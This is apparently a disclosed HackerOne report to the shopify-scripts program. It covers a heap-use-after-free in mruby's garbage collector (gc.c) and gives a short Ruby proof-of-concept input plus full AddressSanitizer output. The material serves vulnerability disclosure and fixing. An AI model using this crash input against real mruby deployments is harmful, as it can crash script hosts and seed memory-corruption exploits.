#  heap-use-after-free /home/operac/testafl/mruby/mrubylast/mruby/src/gc.c

## Report Details
- **Report ID**: 200821
- **URL**: https://hackerone.com/reports/200821
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-01-24T15:28:16.768Z
- **Disclosed**: 2017-02-07T15:39:31.145Z

## Reporter
- **Username**: fms
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
The following code triggers a use-after-free when mruby is compiled with ASAN, on this code path:
https://github.com/mruby/mruby/blob/master/src/gc.c#L762

POC
````
va0ue0=[0,0,0,0]
u=[]
h=[]
va0ue0.each do va0ue0.uniq!do
va0ue0.zip va0ue0.each do v do%  end end end
end
```

ASAN output:
```
operac@hp2:~/testafl/mruby/mrubylast/mruby/bin$ ./mruby 07.min.rb
=================================================================
==7623==ERROR: AddressSanitizer: heap-use-after-free on address 0x62f00001a3d0 at pc 0x0000004eb2bd bp 0x7ffc645dd890 sp 0x7ffc645dd880
READ of size 4 at 0x62f00001a3d0 thread T0
    #0 0x4eb2bc in obj_free /home/operac/testafl/mruby/mrubylast/mruby/src/gc.c:762
    #1 0x4eb2bc in free_heap /home/operac/testafl/mruby/mrubylast/mruby/src/gc.c:384
    #2 0x4eb2bc in mrb_gc_destroy /home/operac/testafl/mruby/mrubylast/mruby/src/gc.c:393
    #3 0x519205 in mrb_close /home/operac/testafl/mruby/mrubylast/mruby/src/state.c:251
    #4 0x405a47 in main /home/operac/testafl/mruby/mrubylast/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:256
    #5 0x7f57ed98a82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
    #6 0x4081f8 in _start (/home/operac/testafl/mruby/mrubylast/mruby/bin/mruby+0x4081f8)

0x62f00001a3d0 is located 49104 bytes inside of 49200-byte region [0x62f00000e400,0x62f00001a430)
freed by thread T0 here:

    #0 0x7f57ee0d4961 in realloc (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x98961)
    #1 0x4ed908 in mrb_realloc_simple /home/operac/testafl/mruby/mrubylast/mruby/src/gc.c:201
    #2 0x4ed908 in mrb_realloc /home/operac/testafl/mruby/mrubylast/mruby/src/gc.c:215
    #3 0x4ee5f2 in mrb_malloc /home/operac/testafl/mruby/mrubylast/mruby/src/gc.c:236
    #4 0x4ee5f2 in mrb_calloc /home/operac/testafl/mruby/mrubylast/mruby/src/gc.c:254
    #5 0x4ee5f2 in add_heap /home/operac/testafl/mruby/mrubylast/mruby/src/gc.c:324
    #6 0x4ee5f2 in mrb_obj_alloc /home/operac/testafl/mruby/mrubylast/mruby/src/gc.c:510
    #7 0x53e319 in mrb_proc_new_cfunc /home/operac/testafl/mruby/mrubylast/mruby/src/proc.c:80
    #8 0x457c42 in mrb_define_method_id /home/operac/testafl/mruby/mrubylast/mruby/src/class.c:393
    #9 0x457c42 in mrb_define_method /home/operac/testafl/mruby/mrubylast/mruby/src/class.c:402
    #10 0x686ef3 in mrb_mruby_random_gem_init /home/operac/testafl/mruby/mrubylast/mruby/mrbgems/mruby-random/src/random.c:333
    #11 0x5f2141 in GENERATED_TMP_mrb_mruby_random_gem_init /home/operac/testafl/mruby/mrubylast/mruby/build/host/mrbgems/mruby-random/gem_init.c:15
    #12 0x5d0e10 in mrb_init_mrbgems /home/operac/testafl/mruby/mrubylast/mruby/build/host/mrbgems/gem_init.c:99
    #13 0x517142 in mrb_open_allocf /home/operac/testafl/mruby/mrubylast/mruby/src/state.c:114
    #14 0x517142 in mrb_open /home/operac/testafl/mruby/mrubylast/mruby/src/state.c:99
    #15 0x40514a in main /home/operac/testafl/mruby/mrubylast/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:172
    #16 0x7f57ed98a82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)

SUMMARY: AddressSanitizer: heap-use-after-free /home/operac/testafl/mruby/mrubylast/mruby/src/gc.c:762 obj_free
Shadow bytes around the buggy address:
  0x0c5e7fffb420: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c5e7fffb430: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c5e7fffb440: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c5e7fffb450: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c5e7fffb460: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
=>0x0c5e7fffb470: fd fd fd fd fd fd fd fd fd fd[fd]fd fd fd fd fd
  0x0c5e7fffb480: fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa
  0x0c5e7fffb490: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c5e7fffb4a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c5e7fffb4b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c5e7fffb4c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
==7623==ABORTING

```

## Attachments
No attachments
